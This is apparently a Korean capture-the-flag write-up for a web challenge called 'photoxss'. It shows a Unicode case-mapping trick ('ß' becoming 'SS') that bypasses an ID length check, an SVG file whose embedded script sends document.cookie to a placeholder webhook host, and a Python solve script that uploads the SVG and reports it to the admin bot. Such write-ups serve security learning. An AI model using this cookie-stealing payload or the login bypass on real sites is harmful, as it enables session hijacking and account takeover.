# photoxss

# usage

# Concept
- file upload xss
- Unicode Case Mapping Collisions

# writeup
먼저 간단히 요약해서 설명하자면 로그인을 한뒤 파일을 업로드하고 리포트를 하는 기능을 가진 웹사이트입니다. 
db를 먼저 잠깐 살펴보자면 
### init.sql
```sql
INSERT INTO users (id, pw) VALUES ('PHOTOXSS_ADMIN', 'photoxss!@@');
```
id랑 pw가 기본적으로 있고 이걸로 로그인을 해야만 업로드가 가능합니다. 
### app.js
```js
app.route('/login')
  .get((req, res) => {
    res.render('login');
  })
  .post((req, res) => {
    let id = req.body.id;
    let pw = req.body.pw;

    if (!id || typeof id !== 'string' || !pw || typeof pw !== 'string') {
      res.send('<script>alert("로그인 실패 ㅋ");window.location.href="/login"</script>');
    } else {
      const id_length = id.length;
      if (id_length >= 14) {
        res.send('<script>alert("ID too long!!");window.location.href="/login"</script>');
      } else {
        id = id.toUpperCase();
        const query = 'SELECT * FROM users WHERE id = ? AND pw = ?';
        conn.query(query, [id, pw], (err, results) => {
          if (err || results.length === 0) {
            res.send('<script>alert("로그인 실패 ㅋ");window.location.href="/login"</script>');
          } else {
            req.session.user = id; 
            res.redirect('/upload');
          }
        });
      }
    }
  });
```
그러나 id길이 제한을 걸어놓은 뒤에 id를 toUpperCase함수로 대문자로 바꿉니다. 
"PHOTOXSS_ADMIN".length == 14 입니다. 그래서 평범한 방법으론 길이 제한으로 인해 로그인이 안되고 
Unicode Case Mapping Collisions으로 우회를 해야합니다. 

"ß".toUpperCase() == 'SS' 입니다. 그래서 PHOTOXß_ADMIN로 로그인을 하면 길이제한을 우회하고 최종적으로 PHOTOXSS_ADMIN으로 로그인할 수 있습니다!!

```js
const upload = multer({
  storage: storage,
  fileFilter: (req, file, cb) => {
    const allowedFileTypes = ['.png', '.jpg', '.svg'];
    const extname = path.extname(file.originalname).toLowerCase();

    if (allowedFileTypes.includes(extname)) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type. Only PNG, JPG, and SVG are allowed.'));
    }
  },
});
```
업로드 부분의 코드를 살펴보면 png, jpg, svg파일만 업로드가 가능합니다.
그리고 flag는 bot의 쿠키에 있습니다! 따라서 문제제목처럼 xss를 하면 됩니다. 

svg은 xss가 가능하기에 svg파일을 업로드하고 그 파일 경로를 report하면 됩니다!!

### solve.svg
물론 웹훅사이트는 실제 웹훅사이트로 바꿔야합니다!!
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      location.replace(`https:/webhooksite/${document.cookie}`)
   </script>
</svg>
```

### solve.py
```py
import requests
import re

url = 'http://localhost:10002'
payload = {"id": "PHOTOXß_ADMIN", "pw": "photoxss!@@"}
sess = requests.Session()
sess.post(url+'/login', data=payload)

file_path = './solve.svg'

# 파일 열기
with open(file_path, 'rb') as solve_svg:
    solve_files = {'file': solve_svg}

    # 업로드 요청 보내기
    res = sess.post(url+'/upload', files=solve_files)

    # 파일 업로드 후에는 파일 객체를 닫습니다.
    solve_svg.close()

    # 파일 업로드 응답에서 URL 추출
    pattern = r'href="(/uploads/[^"]+)"'
    matches = re.findall(pattern, res.text)

    if matches:
        upload_url = matches[0]
        print("파일 업로드 성공:", upload_url)

        report_res = sess.post(url+'/report', data={'url': f"http://127.0.0.1:3000{upload_url}"})
        print(report_res.text)
    else:
        print("URL을 찾을 수 없습니다.")

```
로그인을 하고 그 세션을 유지하면서 같은경로에 있는 svg파일을 업로드하고 업로드된 경로를 저장하고 그 경로를 report합니다!!


솔브 코드를 실행하고 웹훅사이트를 보면 flag가 잘 찍혀있는 것을 확인할 수 있을겁니다!!